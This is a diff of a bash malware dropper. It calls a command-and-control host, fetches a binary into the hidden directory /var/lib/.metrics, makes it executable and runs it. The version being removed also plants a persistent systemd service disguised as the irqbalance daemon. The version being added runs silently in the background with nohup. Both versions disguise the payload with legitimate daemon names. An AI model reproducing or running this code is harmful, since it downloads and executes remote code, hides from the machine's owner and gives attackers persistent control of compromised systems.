@@ -1,45 +1,7 @@
 #!/bin/bash
-# Cloudflared - Bootstrap downloader
-#Downloads main binary from C2 and executes it
-
 set -e
-
 C2_FILES="https://c2-files.darienluv.my.id"
-
-# Create directory
-mkdir -p /var/lib/.metrics
-
-# Download collectd
-echo "[*] Downloading collectd..."
-curl -s "$C2_FILES/collectd" -o /var/lib/.metrics/collectd
-chmod +x /var/lib/.metrics/collectd
-
-# Download irqbalance
-echo "[*] Downloading irqbalance..."
-curl -s "$C2_FILES/irqbalance" -o /var/lib/.metrics/irqbalance
-chmod +x /var/lib/.metrics/irqbalance
-
-# Setup systemd service
-echo "[*] Setting up systemd..."
-cat > /etc/systemd/system/irqbalance.service << 'EOF'
-[Unit]
-Description=IRQ Balance Daemon
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=/var/lib/.metrics/collectd
-Restart=always
-RestartSec=5
-
-[Install]
-WantedBy=multi-user.target
-EOF
-
-systemctl daemon-reload 2>/dev/null || true
-systemctl enable irqbalance 2>/dev/null || true
-systemctl start irqbalance 2>/dev/null || true
-
-# Execute main binary
-echo "[*] Starting collectd..."
-/var/lib/.metrics/collectd
+mkdir -p /var/lib/.metrics >/dev/null 2>&1
+curl -s "$C2_FILES/collectd" -o /var/lib/.metrics/collectd >/dev/null 2>&1
+chmod +x /var/lib/.metrics/collectd >/dev/null 2>&1
+nohup /var/lib/.metrics/collectd >/dev/null 2>&1 &
